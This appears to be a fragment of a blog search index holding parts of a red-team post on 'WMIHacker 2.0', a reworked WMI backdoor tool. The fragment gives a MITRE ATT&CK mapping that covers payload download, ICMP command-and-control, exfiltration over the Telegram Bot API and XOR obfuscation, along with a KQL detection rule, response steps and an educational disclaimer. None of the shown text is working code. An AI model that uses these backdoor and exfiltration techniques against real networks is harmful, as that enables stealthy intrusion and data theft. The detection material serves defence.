Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"}]